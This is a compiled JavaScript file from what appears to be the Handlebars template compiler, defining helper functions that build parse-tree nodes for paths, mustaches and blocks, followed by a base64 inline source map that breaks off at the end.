'use strict';

exports.__esModule = true;
exports.SourceLocation = SourceLocation;
exports.id = id;
exports.stripFlags = stripFlags;
exports.stripComment = stripComment;
exports.preparePath = preparePath;
exports.prepareMustache = prepareMustache;
exports.prepareRawBlock = prepareRawBlock;
exports.prepareBlock = prepareBlock;
exports.prepareProgram = prepareProgram;
exports.preparePartialBlock = preparePartialBlock;
// istanbul ignore next

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { 'default': obj }; }

var _exception = require('../exception');

var _exception2 = _interopRequireDefault(_exception);

function validateClose(open, close) {
  close = close.path ? close.path.original : close;

  if (open.path.original !== close) {
    var errorNode = { loc: open.path.loc };

    throw new _exception2['default'](open.path.original + " doesn't match " + close, errorNode);
  }
}

function SourceLocation(source, locInfo) {
  this.source = source;
  this.start = {
    line: locInfo.first_line,
    column: locInfo.first_column
  };
  this.end = {
    line: locInfo.last_line,
    column: locInfo.last_column
  };
}

function id(token) {
  if (/^\[.*\]$/.test(token)) {
    return token.substr(1, token.length - 2);
  } else {
    return token;
  }
}

function stripFlags(open, close) {
  return {
    open: open.charAt(2) === '~',
    close: close.charAt(close.length - 3) === '~'
  };
}

function stripComment(comment) {
  return comment.replace(/^\{\{~?!-?-?/, '').replace(/-?-?~?\}\}$/, '');
}

function preparePath(data, parts, loc) {
  loc = this.locInfo(loc);

  var original = data ? '@' : '',
      dig = [],
      depth = 0;

  for (var i = 0, l = parts.length; i < l; i++) {
    var part = parts[i].part,

    // If we have [] syntax then we do not treat path references as operators,
    // i.e. foo.[this] resolves to approximately context.foo['this']
    isLiteral = parts[i].original !== part;
    original += (parts[i].separator || '') + part;

    if (!isLiteral && (part === '..' || part === '.' || part === 'this')) {
      if (dig.length > 0) {
        throw new _exception2['default']('Invalid path: ' + original, { loc: loc });
      } else if (part === '..') {
        depth++;
      }
    } else {
      dig.push(part);
    }
  }

  return {
    type: 'PathExpression',
    data: data,
    depth: depth,
    parts: dig,
    original: original,
    loc: loc
  };
}

function prepareMustache(path, params, hash, open, strip, locInfo) {
  // Must use charAt to support IE pre-10
  var escapeFlag = open.charAt(3) || open.charAt(2),
      escaped = escapeFlag !== '{' && escapeFlag !== '&';

  var decorator = /\*/.test(open);
  return {
    type: decorator ? 'Decorator' : 'MustacheStatement',
    path: path,
    params: params,
    hash: hash,
    escaped: escaped,
    strip: strip,
    loc: this.locInfo(locInfo)
  };
}

function prepareRawBlock(openRawBlock, contents, close, locInfo) {
  validateClose(openRawBlock, close);

  locInfo = this.locInfo(locInfo);
  var program = {
    type: 'Program',
    body: contents,
    strip: {},
    loc: locInfo
  };

  return {
    type: 'BlockStatement',
    path: openRawBlock.path,
    params: openRawBlock.params,
    hash: openRawBlock.hash,
    program: program,
    openStrip: {},
    inverseStrip: {},
    closeStrip: {},
    loc: locInfo
  };
}

function prepareBlock(openBlock, program, inverseAndProgram, close, inverted, locInfo) {
  if (close && close.path) {
    validateClose(openBlock, close);
  }

  var decorator = /\*/.test(openBlock.open);

  program.blockParams = openBlock.blockParams;

  var inverse = undefined,
      inverseStrip = undefined;

  if (inverseAndProgram) {
    if (decorator) {
      throw new _exception2['default']('Unexpected inverse block on decorator', inverseAndProgram);
    }

    if (inverseAndProgram.chain) {
      inverseAndProgram.program.body[0].closeStrip = close.strip;
    }

    inverseStrip = inverseAndProgram.strip;
    inverse = inverseAndProgram.program;
  }

  if (inverted) {
    inverted = inverse;
    inverse = program;
    program = inverted;
  }

  return {
    type: decorator ? 'DecoratorBlock' : 'BlockStatement',
    path: openBlock.path,
    params: openBlock.params,
    hash: openBlock.hash,
    program: program,
    inverse: inverse,
    openStrip: openBlock.strip,
    inverseStrip: inverseStrip,
    closeStrip: close && close.strip,
    loc: this.locInfo(locInfo)
  };
}

function prepareProgram(statements, loc) {
  if (!loc && statements.length) {
    var firstLoc = statements[0].loc,
        lastLoc = statements[statements.length - 1].loc;

    /* istanbul ignore else */
    if (firstLoc && lastLoc) {
      loc = {
        source: firstLoc.source,
        start: {
          line: firstLoc.start.line,
          column: firstLoc.start.column
        },
        end: {
          line: lastLoc.end.line,
          column: lastLoc.end.column
        }
      };
    }
  }

  return {
    type: 'Program',
    body: statements,
    strip: {},
    loc: loc
  };
}

function preparePartialBlock(open, program, close, locInfo) {
  validateClose(open, close);

  return {
    type: 'PartialBlockStatement',
    name: open.path,
    params: open.params,
    hash: open.hash,
    program: program,
    openStrip: open.strip,
    closeStrip: close && close.strip,
    loc: this.locInfo(locInfo)
  };
}
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi4uLy4uLy4uLy4uL2xpYi9oYW5kbGViYXJzL2NvbXBpbGVyL2hlbHBlcnMuanMiXSwibmFtZXMiOltdLCJtYXBwaW5ncyI6Ijs7Ozs7Ozs7Ozs7Ozs7Ozs7eUJBQXNCLGNBQWM7Ozs7QUFFcEMsU0FBUyxhQUFhLENBQUMsSUFBSSxFQUFFLEtBQUssRUFBRTtBQUNsQyxPQUFLLEdBQUcsS0FBSyxDQUFDLElBQUksR0FBRyxLQUFLLENBQUMsSUFBSSxDQUFDLFFBQVEsR0FBRyxLQUFLLENBQUM7O0FBRWpELE1BQUksSUFBSSxDQUFDLElBQUksQ0FBQyxRQUFRLEtBQUssS0FBSyxFQUFFO0FBQ2hDLFFBQUksU0FBUyxHQUFHLEVBQUMsR0FBRyxFQUFFLElBQUksQ0FBQyxJQUFJLENBQUMsR0FBRyxFQUFDLENBQUM7O0FBRXJDLFVBQU0sMkJBQWMsSUFBSSxDQUFDLElBQUksQ0FBQyxRQUFRLEdBQUcsaUJBQWlCLEdBQUcsS0FBSyxFQUFFLFNBQVMsQ0FBQyxDQUFDO0dBQ2hGO0NBQ0Y7O0FBRU0sU0FBUyxjQUFjLENBQUMsTUFBTSxFQUFFLE9BQU8sRUFBRTtBQUM5QyxNQUFJLENBQUMsTUFBTSxHQUFHLE1BQU0sQ0FBQztBQUNyQixNQUFJLENBQUMsS0FBSyxHQUFHO0FBQ1gsUUFBSSxFQUFFLE9BQU8sQ0FBQyxVQUFVO0FBQ3hCLFVBQU0sRUFBRSxPQUFPLENBQUMsWUFBWTtHQUM3QixDQUFDO0FBQ0YsTUFBSSxDQUFDLEdBQUcsR0FBRztBQUNULFFBQUksRUFBRSxPQUFPLENBQUMsU0FBUztBQUN2QixVQUFNLEVBQUUsT0FBTyxDQUFDLFdBQVc7R0FDNUIsQ0FBQztDQUNIOztBQUVNLFNBQVMsRUFBRSxDQUFDLEtBQUssRUFBRTtBQUN4QixNQUFJLFVBQVUsQ0FBQyxJQUFJLENBQUMsS0FBSyxDQUFDLEVBQUU7QUFDMUIsV0FBTyxLQUFLLENBQUMsTUFBTSxDQUFDLENBQUMsRUFBRSxLQUFLLENBQUMsTUFBTSxHQUFHLENBQUMsQ0FBQyxDQUFDO0dBQzFDLE1BQU07QUFDTCxXQUFPLEtBQUssQ0FBQztHQUNkO0NBQ0Y7O0FBRU0sU0FBUyxVQUFVLENBQUMsSUFBSSxFQUFFLEtBQUssRUFBRTtBQUN0QyxTQUFPO0FBQ0wsUUFBSSxFQUFFLElBQUksQ0FBQyxNQUFNLENBQUMsQ0FBQyxDQUFDLEtBQUssR0FBRztBQUM1QixTQUFLLEVBQUUsS0FBSyxDQUFDLE1BQU0sQ0FBQyxLQUFLLENBQUMsTUFBTSxHQUFHLENBQUMsQ0FBQyxLQUFLLEdBQUc7R0FDOUMsQ0FBQztDQUNIOztBQUVNLFNBQVMsWUFBWSxDQUFDLE9BQU8sRUFBRTtBQUNwQyxTQUFPLE9BQU8sQ0FBQyxPQUFPLENBQUMsY0FBYyxFQUFFLEVBQUUsQ0FBQyxDQUMzQixPQUFPLENBQUMsYUFBYSxFQUFFLEVBQUUsQ0FBQyxDQUFDO0NBQzNDOztBQUVNLFNBQVMsV0FBVyxDQUFDLElBQUksRUFBRSxLQUFLLEVBQUUsR0FBRyxFQUFFO0FBQzVDLEtBQUcsR0FBRyxJQUFJLENBQUMsT0FBTyxDQUFDLEdBQUcsQ0FBQyxDQUFDOztBQUV4QixNQUFJLFFBQVEsR0FBRyxJQUFJLEdBQUcsR0FBRyxHQUFHLEVBQUU7TUFDMUIsR0FBRyxHQUFHLEVBQUU7TUFDUixLQUFLLEdBQUcsQ0FBQyxDQUFDOztBQUVkLE9BQUssSUFBSSxDQUFDLEdBQUcsQ0FBQyxFQUFFLENBQUMsR0FBRyxLQUFLLENBQUMsTUFBTSxFQUFFLENBQUMsR0FBRyxDQUFDLEVBQUUsQ0FBQyxFQUFFLEVBQUU7QUFDNUMsUUFBSSxJQUFJLEdBQUcsS0FBSyxDQUFDLENBQUMsQ0FBQyxDQUFDLElBQUk7Ozs7QUFHcEIsYUFBUyxHQUFHLEtBQUssQ0FBQyxDQUFDLENBQUMsQ0FBQyxRQUFRLEtBQUssSUFBSSxDQUFDO0FBQzNDLFlBQVEsSUFBSSxDQUFDLEtBQUssQ0FBQyxDQUFDLENBQUMsQ0FBQyxTQUFTLElBQUksRUFBRSxDQUFBLEdBQUksSUFBSSxDQUFDOztBQUU5QyxRQUFJLENBQUMsU0FBUyxLQUFLLElBQUksS0FBSyxJQUFJLElBQUksSUFBSSxLQUFLLEdBQUcsSUFBSSxJQUFJLEtBQUssTUFBTSxDQUFBLEFBQUMsRUFBRTtBQUNwRSxVQUFJLEdBQUcsQ0FBQyxNQUFNLEdBQUcsQ0FBQyxFQUFFO0FBQ2xCLGNBQU0sMkJBQWMsZ0JBQWdCLEdBQUcsUUFBUSxFQUFFLEVBQUMsR0FBRyxFQUFILEdBQUcsRUFBQyxDQUFDLENBQUM7T0FDekQsTUFBTSxJQUFJLElBQUksS0FBSyxJQUFJLEVBQUU7QUFDeEIsYUFBSyxFQUFFLENBQUM7T0FDVDtLQUNGLE1BQU07QUFDTCxTQUFHLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxDQUFDO0tBQ2hCO0dBQ0Y7O0FBRUQsU0FBTztBQUNMLFFBQUksRUFBRSxnQkFBZ0I7QUFDdEIsUUFBSSxFQUFKLElBQUk7QUFDSixTQUFLLEVBQUwsS0FBSztBQUNMLFNBQUssRUFBRSxHQUFHO0FBQ1YsWUFBUSxFQUFSLFFBQVE7QUFDUixPQUFHLEVBQUgsR0FBRztHQUNKLENBQUM7Q0FDSDs7QUFFTSxTQUFTLGVBQWUsQ0FBQyxJQUFJLEVBQUUsTUFBTSxFQUFFLElBQUksRUFBRSxJQUFJLEVBQUUsS0FBSyxFQUFFLE9BQU8sRUFBRTs7QUFFeEUsTUFBSSxVQUFVLEdBQUcsSUFBSSxDQUFDLE1BQU0sQ0FBQyxDQUFDLENBQUMsSUFBSSxJQUFJLENBQUMsTUFBTSxDQUFDLENBQUMsQ0FBQztNQUM3QyxPQUFPLEdBQUcsVUFBVSxLQUFLLEdBQUcsSUFBSSxVQUFVLEtBQUssR0FBRyxDQUFDOztBQUV2RCxNQUFJLFNBQVMsR0FBSSxJQUFJLENBQUMsSUFBSSxDQUFDLElBQUksQ0FBQyxBQUFDLENBQUM7QUFDbEMsU0FBTztBQUNMLFFBQUksRUFBRSxTQUFTLEdBQUcsV0FBVyxHQUFHLG1CQUFtQjtBQUNuRCxRQUFJLEVBQUosSUFBSTtBQUNKLFVBQU0sRUFBTixNQUFNO0FBQ04sUUFBSSxFQUFKLElBQUk7QUFDSixXQUFPLEVBQVAsT0FBTztBQUNQLFNBQUssRUFBTCxLQUFLO0FBQ0wsT0FBRyxFQUFFLElBQUksQ0FBQyxPQUFPLENBQUMsT0FBTyxDQUFDO0dBQzNCLENBQUM7Q0FDSDs7QUFFTSxTQUFTLGVBQWUsQ0FBQyxZQUFZLEVBQUUsUUFBUSxFQUFFLEtBQUssRUFBRSxPQUFPLEVBQUU7QUFDdEUsZUFBYSxDQUFDLFlBQVksRUFBRSxLQUFLLENBQUMsQ0FBQzs7QUFFbkMsU0FBTyxHQUFHLElBQUksQ0FBQyxPQUFPLENBQUMsT0FBTyxDQUFDLENBQUM7QUFDaEMsTUFBSSxPQUFPLEdBQUc7QUFDWixRQUFJLEVBQUUsU0FBUztBQUNmLFFBQUksRUFBRSxRQUFRO0FBQ2QsU0FBSyxFQUFFLEVBQUU7QUFDVCxPQUFHLEVBQUUsT0FBTztHQUNiLENBQUM7O0FBRUYsU0FBTztBQUNMLFFBQUksRUFBRSxnQkFBZ0I7QUFDdEIsUUFBSSxFQUFFLFlBQVksQ0FBQyxJQUFJO0FBQ3ZCLFVBQU0sRUFBRSxZQUFZLENBQUMsTUFBTTtBQUMzQixRQUFJLEVBQUUsWUFBWSxDQUFDLElBQUk7QUFDdkIsV0FBTyxFQUFQLE9BQU87QUFDUCxhQUFTLEVBQUUsRUFBRTtBQUNiLGdCQUFZLEVBQUUsRUFBRTtBQUNoQixjQUFVLEVBQUUsRUFBRTtBQUNkLE9BQUcsRUFBRSxPQUFPO0dBQ2IsQ0FBQztDQUNIOztBQUVNLFNBQVMsWUFBWSxDQUFDLFNBQVMsRUFBRSxPQUFPLEVBQUUsaUJBQWlCLEVBQUUsS0FBSyxFQUFFLFFBQVEsRUFBRSxPQUFPLEVBQUU7QUFDNUYsTUFBSSxLQUFLLElBQUksS0FBSyxDQUFDLElBQUksRUFBRTtBQUN2QixpQkFBYSxDQUFDLFNBQVMsRUFBRSxLQUFLLENBQUMsQ0FBQztHQUNqQzs7QUFFRCxNQUFJLFNBQVMsR0FBSSxJQUFJLENBQUMsSUFBSSxDQUFDLFNBQVMsQ0FBQyxJQUFJLENBQUMsQUFBQyxDQUFDOztBQUU1QyxTQUFPLENBQUMsV0FBVyxHQUFHLFNBQVMsQ0FBQyxXQUFXLENBQUM7O0FBRTVDLE1BQUksT0FBTyxZQUFBO01BQ1AsWUFBWSxZQUFBLENBQUM7O0FBRWpCLE1BQUksaUJBQWlCLEVBQUU7QUFDckIsUUFBSSxTQUFTLEVBQUU7QUFDYixZQUFNLDJCQUFjLHVDQUF1QyxFQUFFLGlCQUFpQixDQUFDLENBQUM7S0FDakY7O0FBRUQsUUFBSSxpQkFBaUIsQ0FBQyxLQUFLLEVBQUU7QUFDM0IsdUJBQWlCLENBQUMsT0FBTyxDQUFDLElBQUksQ0FBQyxDQUFDLENBQUMsQ0FBQyxVQUFVLEdBQUcsS0FBSyxDQUFDLEtBQUssQ0FBQztLQUM1RDs7QUFFRCxnQkFBWSxHQUFHLGlCQUFpQixDQUFDLEtBQUssQ0FBQztBQUN2QyxXQUFPLEdBQUcsaUJBQWlCLENBQUMsT0FBTyxDQUFDO0dBQ3JDOztBQUVELE1BQUksUUFBUSxFQUFFO0FBQ1osWUFBUSxHQUFHLE9BQU8sQ0FBQztBQUNuQixXQUFPLEdBQUcsT0FBTyxDQUFDO0FBQ2xCLFdBQU8sR0FBRyxRQUFRLENBQUM7R0FDcEI7O0FBRUQsU0FBTztBQUNMLFFBQUksRUFBRSxTQUFTLEdBQUcsZ0JBQWdCLEdBQUcsZ0JBQWdCO0FBQ3JELFFBQUksRUFBRSxTQUFTLENBQUMsSUFBSTtBQUNwQixVQUFNLEVBQUUsU0FBUyxDQUFDLE1BQU07QUFDeEIsUUFBSSxFQUFFLFNBQVMsQ0FBQyxJQUFJO0FBQ3BCLFdBQU8sRUFBUCxPQUFPO0FBQ1AsV0FBTyxFQUFQLE9BQU87QUFDUCxhQUFTLEVBQUUsU0FBUyxDQUFDLEtBQUs7QUFDMUIsZ0JBQVksRUFBWixZQUFZO0FBQ1osY0FBVSxFQUFFLEtBQUssSUFBSSxLQUFLLENBQUMsS0FBSztBQUNoQyxPQUFHLEVBQUUsSUFBSSxDQUFDLE9BQU8sQ0FBQyxPQUFPLENBQUM7R0FDM0IsQ0FBQztDQUNIOztBQUVNLFNBQVMsY0FBYyxDQUFDLFVBQVUsRUFBRSxHQUFHLEVBQUU7QUFDOUMsTUFBSSxDQUFDLEdBQUcsSUFBSSxVQUFVLENBQUMsTUFBTSxFQUFFO0FBQzdCLFFBQU0sUUFBUSxHQUFHLFVBQVUsQ0FBQyxDQUFDLENBQUMsQ0FBQyxHQUFHO1FBQzVCLE9BQU8sR0FBRyxVQUFVLENBQUMsVUFBVSxDQUFDLE1BQU0sR0FBRyxDQUFDLENBQUMsQ0FBQyxHQUFHLENBQUM7OztBQUd0RCxRQUFJLFFBQVEsSUFBSSxPQUFPLEVBQUU7QUFDdkIsU0FBRyxHQUFHO0FBQ0osY0FBTSxFQUFFLFFBQVEsQ0FBQyxNQUFNO0FBQ3ZCLGFBQUssRUFBRTtBQUNMLGNBQUksRUFBRSxRQUFRLENBQUMsS0FBSyxDQUFDLElBQUk7QUFDekIsZ0JBQU0sRUFBRSxRQUFRLENBQUMsS0FBSyxDQUFDLE1BQU07U0FDOUI7QUFDRCxXQUFHLEVBQUU7QUFDSCxjQUFJLEVBQUUsT0FBTyxDQUFDLEdBQUcsQ0FBQyxJQUFJO0FBQ3RCLGdCQUFNLEVBQUUsT0FBTyxDQUFDLEdBQUcsQ0FBQyxNQUFNO1NBQzNCO09BQ0YsQ0FBQztLQUNIO0dBQ0Y7O0FBRUQsU0FBTztBQUNMLFFBQUksRUFBRSxTQUFTO0FBQ2YsUUFBSSxFQUFFLFVBQVU7QUFDaEIsU0FBSyxFQUFFLEVBQUU7QUFDVCxPQUFHLEVBQUUsR0FBRztHQUNULENBQUM7Q0FDSDs7QUFHTSxTQUFTLG1CQUFtQixDQUFDLElBQUksRUFBRSxPQUFPLEVBQUUsS0FBSyxFQUFFLE9BQU8sRUFBRTtBQUNqRSxlQUFhLENBQUMsSUFBSSxFQUFFLEtBQUssQ0FBQyxDQUFDOztBQUUzQixTQUFPO0FBQ0wsUUFBSSxFQUFFLHVCQUF1QjtBQUM3QixRQUFJLEVBQUUsSUFBSSxDQUFDLElBQUk7QUFDZixVQUFNLEVBQUUsSUFBSSxDQUFDLE1BQU07QUFDbkIsUUFBSSxFQUFFLElBQUksQ0FBQyxJQUFJO0FBQ2YsV0FBTyxFQUFQLE9BQU87QUFDUCxhQUFTLEVBQUUsSUFBSSxDQUFDLEtBQUs7QUFDckIsY0FBVSxFQUFFLEtBQUssSUFBSSxLQUFLLENBQUMsS0FBSztBQUNoQyxPQUFHLEVBQUUsSUFBSSxDQUFDLE9BQU8sQ0FBQyxPQUFPLENBQUM7R0FDM0IsQ0FBQztDQUNIIiwiZmlsZSI6ImhlbHBlcnMuanMiLCJzb3VyY2VzQ29udGVudCI6WyJpbXBvcnQgRXhjZXB0aW9uIGZyb20gJy4uL2V4Y2VwdGlvbic7XG5cbmZ1bmN0aW9uIHZhbGlkYXRlQ2xvc2Uob3BlbiwgY2xvc2UpIHtcbiAgY2xvc2UgPSBjbG9zZS5wYXRoID8gY2xvc2UucGF0aC5vcmlnaW5hbCA6IGNsb3NlO1xuXG4gIGlmIChvcGVuLnBhdGgub3JpZ2luYWwgIT09IGNsb3NlKSB7XG4gICAgbGV0IGVycm9yTm9kZSA9IHtsb2M6IG9wZW4ucGF0aC5sb2N9O1xuXG4gICAgdGhyb3cgbmV3IEV4Y2VwdGlvbihvcGVuLnBhdGgub3JpZ2luYWwgKyBcIiBkb2Vzbid0IG1hdGNoIFwiICsgY2xvc2UsIGVycm9yTm9kZSk7XG4gIH1cbn1cblxuZXhwb3J0IGZ1bmN0aW9uIFNvdXJjZUxvY2F0aW9uKHNvdXJjZSwgbG9jSW5mbykge1xuICB0aGlzLnNvdXJjZSA9IHNvdXJjZTtcbiAgdGhpcy5zdGFydCA9IHtcbiAgICBsaW5lOiBsb2NJbmZvLmZpcnN0X2xpbmUsXG4gICAgY29sdW1uOiBsb2NJbmZvLmZpcnN0X2NvbHVtblxuICB9O1xuICB0aGlzLmVuZCA9IHtcbiAgICBsaW5lOiBsb2NJbmZvLmxhc3RfbGluZSxcbiAgICBjb2x1bW46IGxvY0luZm8ubGFzdF9jb2x1bW5cbiAgfTtcbn1cblxuZXhwb3J0IGZ1bmN0aW9uIGlkKHRva2VuKSB7XG4gIGlmICgvXlxcWy4qXFxdJC8udGVzdCh0b2tlbikpIHtcbiAgICByZXR1cm4gdG9rZW4uc3Vic3RyKDEsIHRva2VuLmxlbmd0aCAtIDIpO1xuICB9IGVsc2Uge1xuICAgIHJldHVybiB0b2tlbjtcbiAgfVxufVxuXG5leHBvcnQgZnVuY3Rpb24gc3RyaXBGbGFncyhvcGVuLCBjbG9zZSkge1xuICByZXR1cm4ge1xuICAgIG9wZW46IG9wZW4uY2hhckF0KDIpID09PSAnficsXG4gICAgY2xvc2U6IGNsb3NlLmNoYXJBdChjbG9zZS5sZW5ndGggLSAzKSA9PT0gJ34nXG4gIH07XG59XG5cbmV4cG9ydCBmdW5jdGlvbiBzdHJpcENvbW1lbnQoY29tbWVudCkge1xuICByZXR1cm4gY29tbWVudC5yZXBsYWNlKC9eXFx7XFx7fj8hLT8tPy8sICcnKVxuICAgICAgICAgICAgICAgIC5yZXBsYWNlKC8tPy0/fj9cXH1cXH0kLywgJycpO1xufVxuXG5leHBvcnQgZnVuY3Rpb24gcHJlcGFyZVBhdGgoZGF0YSwgcGFydHMsIGxvYykge1xuICBsb2MgPSB0aGlzLmxvY0luZm8obG9jKTtcblxuICBsZXQgb3JpZ2luYWwgPSBkYXRhID8gJ0AnIDogJycsXG4gICAgICBkaWcgPSBbXSxcbiAgICAgIGRlcHRoID0gMDtcblxuICBmb3IgKGxldCBpID0gMCwgbCA9IHBhcnRzLmxlbmd0aDsgaSA8IGw7IGkrKykge1xuICAgIGxldCBwYXJ0ID0gcGFydHNbaV0ucGFydCxcbiAgICAgICAgLy8gSWYgd2UgaGF2ZSBbXSBzeW50YXggdGhlbiB3ZSBkbyBub3QgdHJlYXQgcGF0aCByZWZlcmVuY2VzIGFzIG9wZXJhdG9ycyxcbiAgICAgICAgLy8gaS5lLiBmb28uW3RoaXNdIHJlc29sdmVzIHRvIGFwcHJveGltYXRlbHkgY29udGV4dC5mb29bJ3RoaXMnXVxuICAgICAgICBpc0xpdGVyYWwgPSBwYXJ0c1tpXS5vcmlnaW5hbCAhPT0gcGFydDtcbiAgICBvcmlnaW5hbCArPSAocGFydHNbaV0uc2VwYXJhdG9yIHx8ICcnKSArIHBhcnQ7XG5cbiAgICBpZiAoIWlzTGl0ZXJhbCAmJiAocGFydCA9PT0gJy4uJyB8fCBwYXJ0ID09PSAnLicgfHwgcGFydCA9PT0gJ3RoaXMnKSkge1xuICAgICAgaWYgKGRpZy5sZW5ndGggPiAwKSB7XG4gICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oJ0ludmFsaWQgcGF0aDogJyArIG9yaWdpbmFsLCB7bG9jfSk7XG4gICAgICB9IGVsc2UgaWYgKHBhcnQgPT09ICcuLicpIHtcbiAgICAgICAgZGVwdGgrKztcbiAgICAgIH1cbiAgICB9IGVsc2Uge1xuICAgICAgZGlnLnB1c2gocGFydCk7XG4gICAgfVxuICB9XG5cbiAgcmV0dXJuIHtcbiAgICB0eXBlOiAnUGF0aEV4cHJlc3Npb24nLFxuICAgIGRhdGEsXG4gICAgZGVwdGgsXG4gICAgcGFydHM6IGRpZyxcbiAgICBvcmlnaW5hbCxcbiAgICBsb2NcbiAgfTtcbn1cblxuZXhwb3J0IGZ1bmN0aW9uIHByZXBhcmVNdXN0YWNoZShwYXRoLCBwYXJhbXMsIGhhc2gsIG9wZW4sIHN0cmlwLCBsb2NJbmZvKSB7XG4gIC8vIE11c3QgdXNlIGNoYXJBdCB0byBzdXBwb3J0IElFIHByZS0xMFxuICBsZXQgZXNjYXBlRmxhZyA9IG9wZW4uY2hhckF0KDMpIHx8IG9wZW4uY2hhckF0KDIpLFxuICAgICAgZXNjYXBlZCA9IGVzY2FwZUZsYWcgIT09ICd7JyAmJiBlc2NhcGVGbGFnICE9PSAnJic7XG5cbiAgbGV0IGRlY29yYXRvciA9ICgvXFwqLy50ZXN0KG9wZW4pKTtcbiAgcmV0dXJuIHtcbiAgICB0eXBlOiBkZWNvcmF0b3IgPyAnRGVjb3JhdG9yJyA6ICdNdXN0YWNoZVN0YXRlbWVudCcsXG4gICAgcGF0aCxcbiAgICBwYXJhbXMsXG4gICAgaGFzaCxcbiAgICBlc2NhcGVkLFxuICAgIHN0cmlwLFxuICAgIGxvYzogdGhpcy5sb2NJbmZvKGxvY0luZm8pXG4gIH07XG59XG5cbmV4cG9ydCBmdW5jdGlvbiBwcmVwYXJlUmF3QmxvY2sob3BlblJhd0Jsb2NrLCBjb250ZW50cywgY2xvc2UsIGxvY0luZm8pIHtcbiAgdmFsaWRhdGVDbG9zZShvcGVuUmF3QmxvY2ssIGNsb3NlKTtcblxuICBsb2NJbmZvID0gdGhpcy5sb2NJbmZvKGxvY0luZm8pO1xuICBsZXQgcHJvZ3JhbSA9IHtcbiAgICB0eXBlOiAnUHJvZ3JhbScsXG4gICAgYm9keTogY29udGVudHMsXG4gICAgc3RyaXA6IHt9LFxuICAgIGxvYzogbG9jSW5mb1xuICB9O1xuXG4gIHJldHVybiB7XG4gICAgdHlwZTogJ0Jsb2NrU3RhdGVtZW50JyxcbiAgICBwYXRoOiBvcGVuUmF3QmxvY2sucGF0aCxcbiAgICBwYXJhbXM6IG9wZW5SYXdCbG9jay5wYXJhbXMsXG4gICAgaGFzaDogb3BlblJhd0Jsb2NrLmhhc2gsXG4gICAgcHJvZ3JhbSxcbiAgICBvcGVuU3RyaXA6IHt9LFxuICAgIGludmVyc2VTdHJpcDoge30sXG4gICAgY2xvc2VTdHJpcDoge30sXG4gICAgbG9jOiBsb2NJbmZvXG4gIH07XG59XG5cbmV4cG9ydCBmdW5jdGlvbiBwcmVwYXJlQmxvY2sob3BlbkJsb2NrLCBwcm9ncmFtLCBpbnZlcnNlQW5kUHJvZ3JhbSwgY2xvc2UsIGludmVydGVkLCBsb2NJbmZvKSB7XG4gIGlmIChjbG9zZSAmJiBjbG9zZS5wYXRoKSB7XG4gICAgdmFsaWRhdGVDbG9zZShvcGVuQmxvY2ssIGNsb3NlKTtcbiAgfVxuXG4gIGxldCBkZWNvcmF0b3IgPSAoL1xcKi8udGVzdChvcGVuQmxvY2sub3BlbikpO1xuXG4gIHByb2dyYW0uYmxvY2tQYXJhbXMgPSBvcGVuQmxvY2suYmxvY2tQYXJhbXM7XG5cbiAgbGV0IGludmVyc2UsXG4gICAgICBpbnZlcnNlU3RyaXA7XG5cbiAgaWYgKGludmVyc2VBbmRQcm9ncmFtKSB7XG4gICAgaWYgKGRlY29yYXRvcikge1xuICAgICAgdGhyb3cgbmV3IEV4Y2VwdGlvbignVW5leHBlY3RlZCBpbnZlcnNlIGJsb2NrIG9uIGRlY29yYXRvcicsIGludmVyc2VBbmRQcm9ncmFtKTtcbiAgICB9XG5cbiAgICBpZiAoaW52ZXJzZUFuZFByb2dyYW0uY2hhaW4pIHtcbiAgICAgIGludmVyc2VBbmRQcm9ncmFtLnByb2dyYW0uYm9keVswXS5jbG9zZVN0cmlwID0gY2xvc2Uuc3RyaXA7XG4gICAgfVxuXG4gICAgaW52ZXJzZVN0cmlwID0gaW52ZXJzZUFuZFByb2dyYW0uc3RyaXA7XG4gICAgaW52ZXJzZSA9IGludmVyc2VBbmRQcm9ncmFtLnByb2dyYW07XG4gIH1cblxuICBpZiAoaW52ZXJ0ZWQpIHtcbiAgICBpbnZlcnRlZCA9IGludmVyc2U7XG4gICAgaW52ZXJzZSA9IHByb2dyYW07XG4gICAgcHJvZ3JhbSA9IGludmVydGVkO1xuICB9XG5cbiAgcmV0dXJuIHtcbiAgICB0eXBlOiBkZWNvcmF0b3IgPyAnRGVjb3JhdG9yQmxvY2snIDogJ0Jsb2NrU3RhdGVtZW50JyxcbiAgICBwYXRoOiBvcGVuQmxvY2sucGF0aCxcbiAgICBwYXJhbXM6IG9wZW5CbG9jay5wYXJhbXMsXG4gICAgaGFzaDogb3BlbkJsb2NrLmhhc2gsXG4gICAgcHJvZ3JhbSxcbiAgICBpbnZlcnNlLFxuICAgIG9wZW5TdHJpcDogb3BlbkJsb2NrLnN0cmlwLFxuICAgIGludmVyc2VTdHJpcCxcbiAgICBjbG9zZVN0cmlwOiBjbG9zZSAmJiBjbG9zZS5zdHJpcCxcbiAgICBsb2M6IHRoaXMubG9jSW5mbyhsb2NJbmZvKVxuICB9O1xufVxuXG5leHBvcnQgZnVuY3Rpb24gcHJlcGFyZVByb2dyYW0oc3RhdGVtZW50cywgbG9jKSB7XG4gIGlmICghbG9jICYmIHN0YXRlbWVudHMubGVuZ3RoKSB7XG4gICAgY29uc3QgZmlyc3RMb2MgPSBzdGF0ZW1lbnRzWzBdLmxvYyxcbiAgICAgICAgICBsYXN0TG9jID0gc3RhdGVtZW50c1tzdGF0ZW1lbnRzLmxlbmd0aCAtIDFdLmxvYztcblxuICAgIC8qIGlzdGFuYnVsIGlnbm9yZSBlbHNlICovXG4gICAgaWYgKGZpcnN0TG9jICYmIGxhc3RMb2MpIHtcbiAgICAgIGxvYyA9IHtcbiAgICAgICAgc291cmNlOiBmaXJzdExvYy5zb3VyY2UsXG4gICAgICAgIHN0YXJ0OiB7XG4gICAgICAgICAgbGluZTogZmlyc3RMb2Muc3RhcnQubGluZSxcbiAgICAgICAgICBjb2x1bW46IGZpcnN0TG9jLnN0YXJ0LmNvbHVtblxuICAgICAgICB9LFxuICAgICAgICBlbmQ6IHtcbiAgICAgICAgICBsaW5lOiBsYXN0TG9jLmVuZC5saW5lLFxuICAgICAgICAgIGNvbHVtbjogbGFzdExvYy5lbmQuY29sdW1uXG4gICAgICAgIH1cbiAgICAgIH07XG4gICAgfVxuICB9XG5cbiAgcmV0dXJuIHtcbiAgICB0eXBlOiAnUHJvZ3JhbScsXG4gICAgYm9keTogc3RhdGVtZ